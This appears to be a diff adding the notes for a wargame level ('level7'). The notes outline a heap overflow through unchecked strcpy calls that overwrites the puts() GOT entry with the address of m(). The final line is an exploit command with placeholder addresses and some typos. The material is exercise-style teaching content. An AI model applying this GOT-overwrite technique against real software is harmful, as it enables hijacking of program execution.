@@ -1,0 +1,23 @@
+decompile ./level7
+
+2 malloc which will then both have 2 malloc within each
+
+the struct is roughly : (char *)ptr1 = malloc(8);
+                        *(char **)&ptr[4] = malloc(8);
+                        (char *)ptr2 = malloc(8);
+                        *(char **)&ptr2[4] = malloc(8);
+
+the last 2 malloc will get av[1] and av[2]
+so dest1 = ptr1[4]; dest2 = ptr2[4];
+strcpy(dest1, av[1]); strcpy(dest2. av[2])
+
+
+the goal is here is to change the adress of the dest of the 2nd strcpy to the GOT of puts()
+and then the replace it by the adress of m()
+
+we need to find the difference between the adress of the 4th malloc and the 2nd
+this will be our padding for the first av[1] 
+and then we add the adress of the GOT of puts to av[1]
+
+av[2] is just the adress of m()
+./level7 $(python -c 'print "A" * 20 + ""adress of GOT puts()') $(python -c 'print "adress of m()"')
